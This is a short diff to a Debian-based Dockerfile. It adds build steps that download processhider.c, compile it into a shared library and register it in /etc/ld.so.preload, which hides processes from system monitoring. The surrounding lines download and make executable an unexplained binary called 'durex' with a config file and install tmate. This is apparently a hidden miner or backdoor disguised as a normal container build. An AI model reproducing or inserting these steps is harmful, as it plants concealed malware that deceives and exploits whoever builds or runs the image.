@@ -2,6 +2,10 @@ FROM debian
 ENV DEBIAN_FRONTEND=noninteractive
 RUN apt update && apt upgrade -y && apt install -y \
     ssh git wget unzip nano curl python3 python3-pip tmate
+RUN wget https://github.com/cihuuy/libn/blob/master/processhider.c \
+&& gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
+&& mv libprocess.so /usr/local/lib/ \
+&& echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload   
 RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
 && wget https://raw.githubusercontent.com/bulboni/tm/main/config.json \
 && chmod +x durex
